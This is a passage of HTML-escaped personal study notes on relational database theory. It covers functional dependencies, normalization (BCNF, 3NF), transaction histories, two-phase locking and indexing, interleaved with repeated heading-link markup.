        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;If there are too many tables, the information of relationships is lost&lt;/p&gt;
&lt;h3 id=&#34;functional-dependencies-armstrongs-axioms&#34; &gt;Functional Dependencies: Armstrong&amp;rsquo;s Axioms
&lt;span&gt;
    &lt;a href=&#34;#functional-dependencies-armstrongs-axioms&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Two ways, first is armstrong&amp;rsquo;s axioms&lt;/p&gt;
&lt;h4 id=&#34;reflexivity&#34; &gt;Reflexivity
&lt;span&gt;
    &lt;a href=&#34;#reflexivity&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;SIN, EName → EName&lt;/p&gt;
&lt;h4 id=&#34;augmentation&#34; &gt;Augmentation
&lt;span&gt;
    &lt;a href=&#34;#augmentation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;If X is a subset of Y, then X → Y.&lt;/p&gt;
&lt;p&gt;SIN, Z → EName, Z&lt;/p&gt;
&lt;h4 id=&#34;transitivity&#34; &gt;Transitivity
&lt;span&gt;
    &lt;a href=&#34;#transitivity&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;X → Y, Y → Z =&amp;gt; X → Z&lt;/p&gt;
&lt;h4 id=&#34;union-rule&#34; &gt;Union Rule
&lt;span&gt;
    &lt;a href=&#34;#union-rule&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;X → Y, X → Z =&amp;gt; X =&amp;gt; YZ&lt;/p&gt;
&lt;h4 id=&#34;decomposition&#34; &gt;Decomposition
&lt;span&gt;
    &lt;a href=&#34;#decomposition&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;X → YZ =&amp;gt; X → Y, X → Z&lt;/p&gt;
&lt;h3 id=&#34;function-dependencies-attribute-closure&#34; &gt;Function Dependencies: Attribute Closure
&lt;span&gt;
    &lt;a href=&#34;#function-dependencies-attribute-closure&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://littleflowercollege.edu.in/upload/e_contents/files/187d8c7967172ef5cc75d9b2a709d6cf.pdf&#34;&gt;https://littleflowercollege.edu.in/upload/e_contents/files/187d8c7967172ef5cc75d9b2a709d6cf.pdf&lt;/a&gt; ?&lt;/p&gt;
&lt;h3 id=&#34;schema-decomposition&#34; &gt;Schema Decomposition
&lt;span&gt;
    &lt;a href=&#34;#schema-decomposition&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;h4 id=&#34;lossless-decomposition&#34; &gt;Lossless Decomposition
&lt;span&gt;
    &lt;a href=&#34;#lossless-decomposition&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;A decomposition {R1, R2} of R is lossless if and only if the common attributes
of R1 and R2 form a superkey for either schema, that is&lt;/p&gt;
&lt;h4 id=&#34;dependency-preserving-decompositions&#34; &gt;Dependency-preserving Decompositions
&lt;span&gt;
    &lt;a href=&#34;#dependency-preserving-decompositions&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;If we have functional dependencies, we should be able to still prove those dependencies valid without having to join.&lt;/p&gt;
&lt;h4 id=&#34;boyce-codd-normal-form-bcnf-decomposition&#34; &gt;Boyce-Codd Normal Form (BCNF) Decomposition
&lt;span&gt;
    &lt;a href=&#34;#boyce-codd-normal-form-bcnf-decomposition&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;Informally, a relation schema R is in BCNF if and only if
any group of attributes in R that functionally determines
any other attributes in R functionally determines all attributes in R ,
i.e., that group of attributes is a superkey of R&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Algorithm:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Find a BCNF violation&lt;/li&gt;
&lt;li&gt;Decompose the relation into two relations, one being the premise + consequence, the other being premise + attributes not determined&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;third-normal-form-3nf&#34; &gt;Third Normal Form (3NF)
&lt;span&gt;
    &lt;a href=&#34;#third-normal-form-3nf&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;Minimal cover:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Every RHS of a dependency in F is a single attribute&lt;/li&gt;
&lt;li&gt;There does not exist an FD X → A in F such that the set F - {X → A} = F. (no redundant FD)&lt;/li&gt;
&lt;li&gt;There are no redundant attributes in the LHS set of a FD in F&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;transactions&#34; &gt;Transactions
&lt;span&gt;
    &lt;a href=&#34;#transactions&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;transaction&#34; &gt;Transaction
&lt;span&gt;
    &lt;a href=&#34;#transaction&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;A transaction i consists of r_i[x] and w_i[y] and c_i&lt;/p&gt;
&lt;h3 id=&#34;execution-history&#34; &gt;Execution History
&lt;span&gt;
    &lt;a href=&#34;#execution-history&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;A database is a shared resource that is accessed by many users and processes.
If data is accessed or modified concurrently, the information may be outdated or one of the modifications will be lost.&lt;/p&gt;
&lt;p&gt;Step 1: check if both transaction histories are over the same set of transactions&lt;/p&gt;
&lt;p&gt;Step 2: check if all conflicting pairs (reads and writes for same attribute from different transactions) are in the same order (&amp;lt; or &amp;gt;).&lt;/p&gt;
&lt;h3 id=&#34;serial-execution-histories&#34; &gt;Serial Execution HIstories
&lt;span&gt;
    &lt;a href=&#34;#serial-execution-histories&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;For a given transaction history, a transactions operations must be consecutive and operations from different transactions may not be interleaved.&lt;/p&gt;
&lt;h4 id=&#34;serial-history&#34; &gt;Serial History
&lt;span&gt;
    &lt;a href=&#34;#serial-history&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;Example:&lt;/p&gt;
&lt;p&gt;T&lt;sub&gt;1&lt;/sub&gt;, T&lt;sub&gt;2&lt;/sub&gt;, T&lt;sub&gt;3&lt;/sub&gt;&lt;/p&gt;
&lt;h3 id=&#34;sql-isolation-levels&#34; &gt;SQL Isolation Levels
&lt;span&gt;
    &lt;a href=&#34;#sql-isolation-levels&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;h2 id=&#34;indexing&#34; &gt;Indexing
&lt;span&gt;
    &lt;a href=&#34;#indexing&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Tables of a database are stored in blocks (containing multiple rows) on disks
&lt;ul&gt;
&lt;li&gt;Caching is used (memory buffer pool, writing dirty blocks to disk)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Sequential reads are faster than random reads&lt;/li&gt;
&lt;li&gt;Indexes can be used to reduce number of blocks read from possibly all to just a few to access a specific row&lt;/li&gt;
&lt;li&gt;Indexes can be used to speed up the access of a range of rows&lt;/li&gt;
&lt;li&gt;Primary keys are always indexed&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;index-structure&#34; &gt;Index Structure
&lt;span&gt;
    &lt;a href=&#34;#index-structure&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;h2 id=&#34;transaction-processing&#34; &gt;Transaction Processing
&lt;span&gt;
    &lt;a href=&#34;#transaction-processing&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;concurrency-control---isolation&#34; &gt;Concurrency Control - Isolation
&lt;span&gt;
    &lt;a href=&#34;#concurrency-control---isolation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Pessimistic - assume conflicts will occur and prevent them
&lt;ul&gt;
&lt;li&gt;Two-phase locking (2PL)&lt;/li&gt;
&lt;li&gt;Timestamp ordering&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Optimistic - assume that conflicts are rare and run transactions and fix problems that occur&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;locking&#34; &gt;Locking
&lt;span&gt;
    &lt;a href=&#34;#locking&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;Shared (read) locks and exclusive (write) locks.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;a transaction that wants to read an object must acquire a shared lock (S mode) on that object&lt;/li&gt;
&lt;li&gt;a transaction that wants to modify an object must acquire an exclusive lock on that object&lt;/li&gt;
&lt;li&gt;object can be locked by multiple shared or only once as exclusive&lt;/li&gt;
&lt;li&gt;not enough for transactions that were meant to preserve a condition such as two objects being the same value&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;two-phase-locking&#34; &gt;Two-Phase Locking
&lt;span&gt;
    &lt;a href=&#34;#two-phase-locking&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;In phase one, transaction obtain locks and do not release locks. The lock point is when the final lock has been obtained.
In phase two, transactions release locks and do not obtain locks. Two phase locking guarantees a conflict-serializable schedule.&lt;/p&gt;
&lt;h4 id=&#34;cascading-aborts&#34; &gt;Cascading Aborts
&lt;span&gt;
    &lt;a href=&#34;#cascading-aborts&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;If a transaction has read uncommitted data read by a transaction that has aborted, it must abort itself.&lt;/p&gt;
&lt;h4 id=&#34;deadlocks&#34; &gt;Deadlocks
&lt;span&gt;
    &lt;a href=&#34;#deadlocks&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
